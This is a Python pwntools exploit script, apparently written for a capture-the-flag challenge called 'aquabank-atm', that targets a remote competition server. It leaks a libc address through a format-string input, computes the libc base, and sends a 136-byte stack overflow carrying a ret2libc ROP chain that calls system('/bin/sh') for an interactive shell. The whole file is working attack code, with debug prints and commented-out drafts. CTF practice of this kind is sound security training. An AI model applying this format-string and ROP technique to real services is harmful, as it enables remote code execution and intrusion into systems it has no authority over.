#!/usr/bin/env python3 
from pwn import * 
context.binary = elf = ELF('./aquabank-atm', checksec=False) 
libc = ELF("./libc.so.6") 
#libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
OFFSET_TO_RIP = 136 
p = remote ("offsec.m0lecon.it", 13526) 
#p = process(elf.path)
rop = ROP(libc)

#payload = flat( 
#b'A' * OFFSET_TO_RIP, 
#p64(ret), #p64(pop_rdi), 
#p64(binsh), #p64(elf.plt.system), 
#) 

p.recvuntil(b'Exit') 
p.sendline(b'1') 
p.recvuntil(b'note: ') 
# stack leak at index 13
p.sendline(b'%13$p')
p.recvuntil(b'Exit') 
p.sendline(b'2') 
p.recvuntil(b"--- Your customer note ---\n") 

leak = int(p.recvline().strip(), 16) 
print(leak)

#with info proc mappings to find offset, could also have done it with info symbols 
libc_base = leak - 0x2a1ca
 
log.info(f"leak = {hex(leak)}")
log.success(f"libc base: {libc_base:#x}")

pop_rdi = libc_base + next(libc.search(asm('pop rdi; ret'))) 
ret = libc_base + rop.find_gadget(['ret'])[0]
bin_sh = libc_base + next(libc.search(b'/bin/sh')) 
system = libc_base + libc.symbols['system'] 

print(f"pop_rdi offset: {(pop_rdi - libc_base):#x}") # should be 0x2a9b7 
#print(f"ret offset: {(ret - libc_base):#x}") # should be 0x2846b print(f"bin_sh offset: {(bin_sh - libc_base):#x}") # should be 0x1aaea4 print(f"system offset: {(system - libc_base):#x}") 
log.info(f"pop rdi: {pop_rdi:#x}") 
log.info(f"system: {system:#x}") 
log.info(f"/bin/sh: {bin_sh:#x}") 

p.recvuntil(b'Exit') 
p.sendline(b'3') 

# Debug: print everything you receive
data = p.recvuntil(b'account: ')
print(f"[DEBUG] got: {data}")
p.sendline(b'1234')

data = p.recvuntil(b'Amount: ')
print(f"[DEBUG] got: {data}")
p.sendline(b'1')  # try a valid number here

# Capture the EXACT prompt before the overflow input
data = p.recvuntil(b':\n')
print(f"[DEBUG] final prompt: {repr(data)}")
#p.recvuntil(b'account: ') 
#p.sendline(b'xxxx') 
#p.recvuntil(b'Amount: ') 
#p.sendline(b'xxxx') 
#p.recvuntil(b'brief):\n') #

pop_rdi = libc_base + next(libc.search(asm('pop rdi; ret')))
pop_rsi = libc_base + next(libc.search(asm('pop rsi; ret')))
pop_rdx = libc_base + next(libc.search(asm('pop rdx; ret')))  
execve  = libc_base + libc.symbols['execve']
bin_sh  = libc_base + next(libc.search(b'/bin/sh'))


import time
time.sleep(0.2)
#p.recvline() 
stage2 = flat( 
                           b'A' * OFFSET_TO_RIP, 
                           p64(ret), 
                           p64(pop_rdi), 
                           p64(bin_sh), 
                           p64(system), 
                           ) 


p.sendline(stage2)
p.recvuntil(b'Queued withdrawal from ', timeout=3)
p.recvline()
p.interactive()

